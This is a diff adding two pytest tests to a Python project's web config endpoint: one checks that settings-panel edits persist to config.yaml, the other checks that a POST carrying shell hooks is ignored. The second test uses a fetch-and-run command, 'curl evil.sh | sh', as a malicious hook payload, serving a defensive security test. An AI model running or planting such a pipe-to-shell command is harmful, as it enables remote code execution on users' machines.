@@ -10,6 +10,7 @@
 """
 from __future__ import annotations
 
+import json
 import os
 import tempfile
 from pathlib import Path
@@ -17,6 +18,7 @@ from types import ModuleType
 from typing import Any
 
 import conftest  # noqa: F401  先 import 它: 模块体把 scripts/ 塞进 sys.path (standalone 直跑时 pytest 不在)
+from skeinlib.config import _yaml_load  # noqa: E402
 from skeinlib.serve import build_app  # noqa: E402
 from test_views_char import TNOW, _load, _seed  # noqa: E402
 
@@ -132,8 +134,96 @@ def test_uvicorn_app_string_resolves() -> None:
             f"{fname}: {mod_name} 里没有 {attr} — uvicorn 起服务时会 Attribute not found"
 
 
+def test_config_panel_shaped_payload_persists() -> None:
+    """webapp 设置面板 (w1) 的提交形状: GET 生效值深拷贝再覆盖编辑字段, 不含 hooks —— 落盘正确,
+    且未渲染控件的分组子键 (如 deprecated `spec.core_budget`) 原样带回, 不被兜底成默认值。
+
+    对齐 plugins/tools/skein/assets/webapp/src/new/settings.js 的提交逻辑 (`onSave` 深拷贝 cfg
+    + delete payload.hooks + 覆盖 8 个可编辑字段), 前端一旦跑偏这条测试的形状假设就该跟着改。
+    """
+    m = _load()
+    cwd0 = os.getcwd()
+    with tempfile.TemporaryDirectory() as td:
+        d = Path(td)
+        _seed(d)
+        os.chdir(d)
+        try:
+            sk = _seeded_skein(m, d)
+            app, _ = _built(m, sk)
+            with _client(app) as c:
+                got = c.get("/__skein__/config").json()
+                assert got["max_active"] == 2  # 前置: 种子仓走默认值 (CONFIG_DEFAULTS)
+
+                payload = json.loads(json.dumps(got))  # 面板 onSave 的深拷贝
+                del payload["hooks"]                    # 🔒 面板硬约束: 提交负载禁带 hooks
+                payload["max_active"] = 5
+                payload["auto_commit"] = False
+                payload["retain_days"] = -1
+                payload["worktree"] = {**payload["worktree"], "enabled": False, "root": "custom-wt"}
+                payload["web"] = {**payload["web"], "serve": False, "board_open": False}
+                payload["spec"] = {**payload["spec"], "always_budget": 2000}
+                # 面板不渲染 spec.core_budget 的编辑控件, 但深拷贝把它原样带回 (非默认值哨兵)
+                assert payload["spec"]["core_budget"] == 400  # 深拷贝保留的即是 GET 到的生效值
+
+                r = c.post("/__skein__/config", json=payload)
+                assert r.status_code == 200
+                saved = r.json()["config"]
+                assert saved["max_active"] == 5
+                assert saved["auto_commit"] is False
+                assert saved["retain_days"] == -1
+                assert saved["worktree"] == {"enabled": False, "root": "custom-wt"}
+                assert saved["web"] == {"serve": False, "board_open": False}
+                assert saved["spec"]["always_budget"] == 2000
+                assert saved["spec"]["core_budget"] == 400  # 未编辑字段没被 CONFIG_DEFAULTS 兜底覆盖
+
+                # 真落盘: 直接读 config.yaml, 不止是响应体
+                on_disk = _yaml_load((sk.dir / "config.yaml").read_text())
+                assert on_disk["max_active"] == 5
+                assert on_disk["worktree"]["root"] == "custom-wt"
+                assert on_disk["spec"]["core_budget"] == 400
+
+                # 重开面板 = 再 GET 一次, 必须看到刚保存的新值 (不是缓存的旧响应)
+                reread = c.get("/__skein__/config").json()
+                assert reread["max_active"] == 5
+                assert reread["worktree"]["root"] == "custom-wt"
+        finally:
+            os.chdir(cwd0)
+
+
+def test_config_post_never_persists_hooks() -> None:
+    """即便面板 bug 或攻击者绕过前端直接打 POST 帯 hooks (shell 命令), 后端必须原样忽略 ——
+
+    CFG_REMOTE_DENY 是最后一道闸: 远程可写 hooks = RCE。这条测试独立于面板前端逻辑, 直接验证
+    `/__skein__/config` 端点本身的安全边界, 不信任前端 `delete payload.hooks` 那一层。
+    """
+    m = _load()
+    cwd0 = os.getcwd()
+    with tempfile.TemporaryDirectory() as td:
+        d = Path(td)
+        _seed(d)
+        os.chdir(d)
+        try:
+            sk = _seeded_skein(m, d)
+            app, _ = _built(m, sk)
+            with _client(app) as c:
+                before_hooks = c.get("/__skein__/config").json()["hooks"]
+                evil = {"hooks": {"create": {"before": ["curl evil.sh | sh"], "after": []}}}
+                r = c.post("/__skein__/config", json=evil)
+                assert r.status_code == 200
+                saved = r.json()["config"]
+                assert saved["hooks"] == before_hooks  # 恶意 hooks 负载被整块忽略
+
+                on_disk = _yaml_load((sk.dir / "config.yaml").read_text())
+                assert on_disk["hooks"] == before_hooks
+                assert "curl evil.sh" not in json.dumps(on_disk)
+        finally:
+            os.chdir(cwd0)
+
+
 if __name__ == "__main__":
     test_routes_real()
     test_seam_datasource_injected()
     test_uvicorn_app_string_resolves()
+    test_config_panel_shaped_payload_persists()
+    test_config_post_never_persists_hooks()
     print("ok")
